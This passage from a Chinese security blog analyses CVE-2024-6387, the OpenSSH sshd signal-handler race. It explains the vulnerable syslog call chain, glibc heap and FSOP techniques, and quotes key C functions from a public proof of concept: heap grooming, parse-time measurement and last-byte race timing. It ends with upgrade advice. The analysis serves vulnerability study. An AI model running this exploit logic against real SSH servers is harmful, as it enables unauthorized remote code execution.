349</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal handler for the alarm after the login grace period has expired.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">grace_alarm_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to kill any processes that we have spawned, E.g. authorized</span></span><br><span class="line"><span class="comment">	 * keys command helpers or privsep children.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (getpgid(<span class="number">0</span>) == getpid()) &#123;</span><br><span class="line">		ssh_signal(SIGTERM, SIG_IGN);</span><br><span class="line">		kill(<span class="number">0</span>, SIGTERM);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Log error and exit. */</span></span><br><span class="line">	sigdie(<span class="string">&quot;Timeout before authentication for %s port %d&quot;</span>,</span><br><span class="line">	    ssh_remote_ipaddr(the_active_state),</span><br><span class="line">	    ssh_remote_port(the_active_state));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注 <code>sigdie</code>。下面是该函数的一条调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sigdie                  // log.h, line 96</span><br><span class="line">  sshsigdie             // log.c, line 450</span><br><span class="line">    sshlogv             // log.c, line 463</span><br><span class="line">      do_log            // log.c, line 336</span><br><span class="line">        syslog</span><br></pre></td></tr></table></figure>
<p><code>syslog</code> 是libc实现的库函数。如果在其中调用了异步执行不安全的函数（如 <code>malloc</code> ，因为 <code>malloc</code> 进行内存分配时不会加锁），那么就有可能出现内存不安全问题。</p>
<p>事实是，它确实调用了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syslog                        /misc/bits/syslog.h, line 28</span><br><span class="line">  __syslog_chk                /misc/syslog.c, line 103</span><br><span class="line">    __vsyslog_internal        /misc/syslog.c, line 119</span><br><span class="line">      __localtime64_r         /time/localtime.c, line 27</span><br><span class="line">        __tz_convert          /time/tzset.c, line 566</span><br><span class="line">          tzset_internal      /time/tzset.c, line 366</span><br><span class="line">            __tzfile_read     /time/tzset.c, line 100</span><br><span class="line">              fopen</span><br><span class="line">              __fread_unlocked</span><br></pre></td></tr></table></figure>
<p>当 <code>__localtime64_r</code> 第一次执行时，将按照上面的流程执行。可以看到，这里的 <code>fopen</code> 即为异步不安全函数调用，它的内部需要调用 <code>malloc</code> 分配一个 <code>FILE</code> 结构。在 <code>__fread_unlocked</code> 中也需要调用 <code>malloc</code> 分配一个 4KB 的读缓冲区。</p>
<h1 id="b-漏洞利用前置知识"><a class="markdownIt-Anchor" href="#b-漏洞利用前置知识"></a> B. 漏洞利用前置知识</h1>
<p>要深入理解该漏洞的整个利用逻辑，首先需要了解一些前置知识。</p>
<h2 id="b1-相关-ssh-协议报文格式"><a class="markdownIt-Anchor" href="#b1-相关-ssh-协议报文格式"></a> B.1 相关 SSH 协议报文格式</h2>
<p>OpenSSH 实现了对于 SSH 协议的所有解析逻辑，在本漏洞中，需要了解的是 SSH 协议的算法交换部分。</p>
<p>在 SSH 建立连接之前，首先需要完成客户端与服务端的算法协商，这些算法包括密钥交换算法、报文加密算法等。因为客户端与服务端的 SSH 版本可能不同，支持的算法也可能不同，因此需要协商出客户端与服务端都实现的算法。对于算法的协商，SSH 协议通过4个报文完成：</p>
<ol>
<li>客户端将自身支持的算法发送至服务端。</li>
<li>服务端将自身支持的算法发送至客户端。</li>
<li>客户端向服务器发送自己选择的算法。</li>
<li>服务端向客户端发送响应，表示收到客户端的算法选择。</li>
</ol>
<p>在前面两个报文中，对于支持算法的发送采用的是 ASCII 明文。具体的 SSH 报文格式如下：</p>
<ul>
<li>4 bytes – SSH 报文总长度（大端序）</li>
<li>1 byte – padding length，即最后用于填充的字节数量</li>
<li>1 byte – message code，即 SSH 报文消息码，算法选择的消息码为 20/0x14</li>
<li>16 bytes – cookie</li>
<li>变长部分 – 用于列举所有本端可用的算法。每一种算法发送的格式为：
<ul>
<li>4 bytes – algorithm length，即算法描述的长度</li>
<li>变长部分 – 算法的具体内容，以 ASCII 码形式发送</li>
</ul>
</li>
</ul>
<p><img src="3.png" alt="" /></p>
<p>可想而知，对于服务端与客户端而言，要想实现对这个报文的解析，必须使用一定的内存空间保存这些算法的相关描述。这一逻辑在 SSHd 中通过 <code>sshkey.c</code> 中的 <code>cert_parse</code>（line 1761）函数实现。在这个函数中循环调用 <code>malloc</code> 函数以保存报文内容。当发送的报文解析失败时，将会调用 <code>sshkey.c</code> 中的 <code>cert_free</code>（line 569）函数循环释放这些内存空间。</p>
<h2 id="b2-glibc-内存分配相关规则"><a class="markdownIt-Anchor" href="#b2-glibc-内存分配相关规则"></a> B.2 Glibc 内存分配相关规则</h2>
<p>该漏洞已经证实能够在基于 Glibc 的 Linux SSH 中完成利用。这与 Glibc 的内存分配策略高度相关。</p>
<p>Glibc 将一块用户可用堆内存（称为 chunk）的大小保存在其前面（低地址）的位置，当用户程序需要释放 chunk 时，Glibc 将根据这块内存的大小将 chunk 链入不同的链表中（这些链表称为 bins）。根据功能不同，Glibc 将这些 bins 分为几类：tcache、fastbin、small bin、large bin、unsorted bin。</p>
<p>Glibc 的内存分配主要通过 <code>_int_malloc</code> 函数实现，释放则主要通过 <code>_int_free</code> 实现。在<a href="elixir.bootlin.com">网址</a>中可以找到所有版本的 Glibc 源码，感兴趣的读者可自行查看。下面介绍与本漏洞相关的一些内存分配特性：</p>
<p>在内存分配过程中，Glibc 首先会从 tcache、fastbin、small bin 中查找，如果没有找到合适的 chunk，则会遍历 unsorted bin 进行查找。unsorted bin 中可保存任意大小的较大的 chunk，遍历过程中，如果发现不等于分配需求的 chunk，会根据其大小将其转移到合适的 small bin/large bin 中。当 unsorted bin 遍历完毕后，如果还是没有找到合适的 chunk，则会尝试在 large bins 中寻找可用的大 chunk 并拆分之。这个拆分操作需要满足多个前提条件，这里不是重点。拆分完成后，剩余的 chunk 将会保存为 last remainder，该 chunk 将被放在 unsorted bin 的开头位置，它将在下一次遍历 unsorted bin 时优先被考虑分配。需要注意的是，<font color=red><strong>remainder chunk 是在其拆分完成后设置其 size 字段的。</strong></font>在 remainder chunk 被切分出来后，但没有设置 size 前，对 size 字段进行修改，即可实际上控制这个 chunk 的大小，可以让这个 chunk 与后面的 chunk 重叠。在 size 字段被正确修改前立即将该 chunk 分配出去，即可完成对堆内存的破坏。</p>
<p><img src="CVE-2024-6387-%E5%88%86%E6%9E%90/2.png" alt="" /></p>
<p>为了保证其他的内存分配操作不会破坏所需的堆内存布局，客户端可以通过多次发送公钥数据包填充 <code>tcache</code>，为了提升利用的成功率，在公钥文件不大于256KB的情况下，可以生成27个 large-small holes 结构。</p>
<h1 id="c-poc"><a class="markdownIt-Anchor" href="#c-poc"></a> C. POC</h1>
<p>POC 来源：<a target="_blank" rel="noopener" href="https://github.com/lflare/cve-2024-6387-poc">github</a></p>
<p>下面分析POC中的关键代码逻辑。通过下面的分析可以帮助读者彻底了解该漏洞的利用方式、</p>
<p>在POC中，首先需要进行与SSH服务器的连接与密钥交换。这部分代码不是重点，略过。</p>
<h2 id="c1-堆内存布局"><a class="markdownIt-Anchor" href="#c1-堆内存布局"></a> C.1 堆内存布局</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_heap</span> <span class="params">(<span class="type">int</span> sock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Packet a: Allocate and free tcache chunks</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> tcache_chunk[<span class="number">64</span>];</span><br><span class="line">      <span class="built_in">memset</span> (tcache_chunk, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, tcache_chunk, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      <span class="comment">// These will be freed by the server, populating tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet b: Create 27 pairs of large (~8KB) and small (320B) holes</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Allocate large chunk (~8KB)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> large_hole[<span class="number">8192</span>];</span><br><span class="line">      <span class="built_in">memset</span> (large_hole, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, large_hole, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate small chunk (320B)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> small_hole[<span class="number">320</span>];</span><br><span class="line">      <span class="built_in">memset</span> (small_hole, <span class="string">&#x27;C&#x27;</span>, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, small_hole, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet c: Write fake headers, footers, vtable and _codecvt pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> fake_data[<span class="number">4096</span>];</span><br><span class="line">      create_fake_file_structure (fake_data, <span class="keyword">sizeof</span> (fake_data),</span><br><span class="line">                                  GLIBC_BASES[<span class="number">0</span>]);</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, fake_data, <span class="keyword">sizeof</span> (fake_data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet d: Ensure holes are in correct malloc bins (send ~256KB string)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> large_string[MAX_PACKET_SIZE - <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">memset</span> (large_string, <span class="string">&#x27;E&#x27;</span>, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">  send_packet (sock, <span class="number">5</span>, large_string, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>send_packet</code> 实现了一个简单的 SSH 协议数据包封装，用于发送 SSH 数据包。</p>
<p>该函数中一共发送了4个数据包，这4个数据包的作用分别为：</p>
<ol>
<li>填充 tcache。</li>
<li>创建 27 个大小 chunk 对，大 chunk 为 8KB，小 chunk 为 320B。</li>
<li>写入伪造的 FILE 结构体数据。</li>
<li>发送一个超大数据包，使得服务端对该 chunk 进行分配与释放，令 glibc 将 27 个大小 chunk 对中的 27 个大 chunk 和 27 个小 chunk 转移到 large bins 与 small bins 中。</li>
</ol>
<h2 id="c2-服务端解析数据时间测量"><a class="markdownIt-Anchor" href="#c2-服务端解析数据时间测量"></a> C.2 服务端解析数据时间测量</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">time_final_packet</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> *parsing_time)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> time_before = measure_response_time (sock, <span class="number">1</span>);</span><br><span class="line">  <span class="type">double</span> time_after = measure_response_time (sock, <span class="number">2</span>);</span><br><span class="line">  *parsing_time = time_after - time_before;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;Estimated parsing time: %.6f seconds\n&quot;</span>, *parsing_time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span></span><br><span class="line"><span class="title function_">measure_response_time</span> <span class="params">(<span class="type">int</span> sock, <span class="type">int</span> error_type)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">end</span>;</span></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line">  send_packet (sock, <span class="number">50</span>, error_packet,</span><br><span class="line">               packet_size); <span class="comment">// SSH_MSG_USERAUTH_REQUEST</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> response[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">ssize_t</span> received;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      received = recv (sock, response, <span class="keyword">sizeof</span> (response), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (received &lt; <span class="number">0</span> &amp;&amp; (errno == EWOULDBLOCK || errno == EAGAIN));</span><br><span class="line"></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;end);</span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> elapsed</span><br><span class="line">      = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">  <span class="keyword">return</span> elapsed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆内存布局完成后，POC 中通过 <code>time_final_packet</code> 来测量服务端解析客户端发送的数据的所需时间。这里测量了两次，分别代表不同错误的解析时间。两次测量对应的错误在 SSHd 中的时间差产生于是否调用了 <code>sshkey_from_blob</code>，因此将两个时间段相减即可得到函数 <code>sshkey_from_blob</code> 的执行时间。</p>
<h2 id="c3-条件竞争"><a class="markdownIt-Anchor" href="#c3-条件竞争"></a> C.3 条件竞争</h2>
<p>完成上述操作之后，客户端还需要发送最后一个超大的 SSH 报文。该报文是算法协商报文，长度为 SSH 协议允许的最大长度。由于 SSH 报文前面带有长度字段，因此一个 SSH 报文允许被包装在多个 TCP 报文中传输。在下面的代码中，POC 直接发送最后一个报文，但故意少发送 1 个字节，让服务端一直等待最后 1 个字节的到来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">attempt_race_condition</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> parsing_time, <span class="type">uint64_t</span> glibc_base)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> final_packet[MAX_PACKET_SIZE];</span><br><span class="line">  create_public_key_packet (final_packet, <span class="keyword">sizeof</span> (final_packet), glibc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Send all but the last byte</span></span><br><span class="line">  <span class="keyword">if</span> (send (sock, final_packet, <span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;send final packet&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>随后，进行计时，准备好在即将超时的瞬间发送最后 1 个字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Precise timing for last byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">current</span>;</span></span><br><span class="line">clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    clock_gettime (CLOCK_MONOTONIC, &amp;current);</span><br><span class="line">    <span class="type">double</span> elapsed = (current.tv_sec - start.tv_sec)</span><br><span class="line">                     + (current.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">if</span> (elapsed &gt;= (LOGIN_GRACE_TIME - parsing_time - <span class="number">0.001</span>))</span><br><span class="line">      &#123; <span class="comment">// 1ms before SIGALRM</span></span><br><span class="line">        <span class="keyword">if</span> (send (sock, &amp;final_packet[<span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>], <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            perror (<span class="string">&quot;send last byte&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>发送最后一个字节后，服务端发现这是一个算法协商报文，因此会多次调用 <code>cert_parse</code> 函数进行解析。POC 精心构造了这个超长报文，使得 <code>cert_parse</code> 将会循环 54 次解析过程，每次解析过程都会调用一次 <code>malloc</code> 函数。POC 能够让 SSHd 以 0x4096、0x304（<code>FILE</code> 结构体的大小）、0x4096、0x304、… 的顺序调用 <code>malloc</code> 函数分配内存，使得在后面的一段时间内，SSHd 会进行一系列的内存分配，同时由于超时，SSHd 将异步地执行另外的内存分配。在此之前，由于我们分配的 8KB、320 Bytes 内存中的任意内容均可控，因此完全可以提前在 320 byte 的 chunk 中写好伪造的 <code>FILE</code> 结构体与虚假的过大的 remainder size。这样一来，只要 <code>syslog</code> 抢在 remainder size 更新前将虚大的 remainder 分配出去，就能够使 remainder 部分覆盖 <code>syslog</code> 获取的 <code>FILE</code> 结构体。</p>
<p>注意：由于 0x320 chunk 位于 tcache，因此 <code>syslog</code> 获取 <code>FILE</code> 结构体并不会切分 remainder，这个操作是由后面分配 4KB 的读缓冲区触发的。切分 remainder 后，还会剩下一个小 remainder，<code>_int_malloc</code> 一更新这个小 remainder 的相关字段，就完成了对 <code>syslog</code> 的 <code>FILE</code> 结构体的破坏。</p>
<p><img src="2.png" alt="" /></p>
<h2 id="c4-fsop"><a class="markdownIt-Anchor" href="#c4-fsop"></a> C.4 FSOP</h2>
<p>该漏洞在32位下可以通过 FSOP 完成利用，这主要是考虑到 32 位系统的 ASLR 保护不完善，Glibc 只能映射到两个基地址：0xb7400000 或 0xb7200000。这正给了攻击者做文章的机会。</p>
<p>在上一节，我们提到通过更新 remainder 的 相关字段，能够达到破坏 <code>FILE</code> 结构体的效果。具体而言，它实际上是修改了 <code>FILE</code> 结构体中的 <code>_vtable_offset</code> 字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果猜测 Glibc 的映射基地址为 0xb7400000，那么 last remainder 的 <code>fd</code> 指针与 <code>bk</code> 指针指向 unsorted bin 后，其值应该为 0xb761d7f8（随 Glibc 版本不同而不同，但高 2 字节基本都相同），反映到上面的 <code>FILE</code> 结构体中，则是将 <code>_vtable_offset</code> 修改为 <code>bk</code> 指针的第 3 个字节——0x61。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Glibc 2.36, /malloc/malloc.c, line 4024</span></span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">  av-&gt;last_remainder = remainder;</span><br><span class="line">  remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>在 Glibc 中，对于文件读写等操作的相关函数是统一保存在一个个 vtable 中的，实际执行时需要首先访问 vtable，再获取其中的函数指针以调用执行。将 <code>_vtable_offset</code> 改为 0x61 后，<code>syslog</code> 的 <code>__fread_unlocked</code> 将会找到 <code>_IO_wfile_jumps</code> 这个 vtable，选择其中的 <code>_IO_wfile_underflow</code> 函数执行（正常情况下应该是执行 <code>_IO_file_jumps</code> 中的 <code>_IO_file_underflow</code>）。在 <code>_IO_wfile_underflow</code> 中，存在下面的调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow     // Glibc 2.36, /libio/wfileops.c, line 110</span><br><span class="line">  __libio_codecvt_in    // Glibc 2.36, /libio/iofwide.c, line 161</span><br><span class="line">    DL_CALL_FCT         // Glibc 2.36, /iconv/skeleton.c, line 153</span><br></pre></td></tr></table></figure>
<p>需要注意的是，<code>fopen</code> 并没有对 <code>FILE</code> 结构体的 <code>_codecvt</code> 字段进行初始化，因此依然可以通过提前布置值完成对该字段的控制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_codecvt        // Glibc 2.36, /libio/libio.h, line 114</span><br><span class="line">  _IO_iconv_t             // Glibc 2.36, /libio/libio.h, line 50</span><br><span class="line">    __gconv_step          // Glibc 2.36, /iconv/gconv.h, line 83</span><br><span class="line">      __gconv_fct __fct</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从上面的结构定义层次来看，我们需要的 <code>__fct</code> 函数指针经过多层结构包装。为了让提前写入的指针能够完整地构建调用链，攻击者可以选择将 <code>_codecvt</code> 写成 Glibc 的 bins 的地址，这样实际就是让 Glibc 将我们释放的 chunk 的前面一小部分看做 <code>_IO_iconv_t</code> 结构，接下去如法炮制，在已经释放的 chunk 中完成精心构造，即可让代码最终执行我们伪造的 <code>__fct</code> 函数指针，完成任意代码执行。</p>
<h1 id="d-相关挑战"><a class="markdownIt-Anchor" href="#d-相关挑战"></a> D. 相关挑战</h1>
<p>该漏洞的利用较为困难，这主要是因为猜测 ASLR 与时间窗口竞争叠加的结果。</p>
<p>地址空间布局随机化（Address Space Layout Randomization）是一种常用的程序运行时保护方式，多次执行时，同一个段会映射到不同的内存地址。但 glibc 在32位下实际上只会映射到 0xb7400000 或 0xb7200000，因此实现 FSOP 还是有可能的。但是时间竞争窗口较小，导致总体成功率依然极低（实验室环境下6~8小时尝试平均10000次才能成功）。在 64 位强化 ASLR 中，通过猜测 glibc 加载地址进行攻击的利用方式就更加无法实现了，需要通过其他的方式完成漏洞利用。</p>
<h1 id="e-总结"><a class="markdownIt-Anchor" href="#e-总结"></a> E. 总结</h1>
<p>CVE-2024-6387 是一个高危的未授权任意代码远程执行漏洞，虽然目前的攻击方式较为复杂，攻击成功所需时间较长，但其危害仍不容忽视。建议升级 OpenSSH 至 9.8v1 及更高版本，或通过防火墙等方式缓解风险。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">PHP pwn 学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-01 18:31:42" itemprop="dateCreated datePublished" datetime="2024-07-01T18:31:42+08:00">2024-07-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-19 09:05:10" itemprop="dateModified" datetime="2024-07-19T09:05:10+08:00">2024-07-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">PHP pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>上一篇blog中，我们学习了一些PHP extension for C的基本内容，下面结合一道题来进行分析，同时学习一些题目中会涉及的新内容。</p>
<p>题目示例：2024 D^3CTF PwnShell <a href="D3CTF_Pwnshell.tar.gz">链接</a></p>
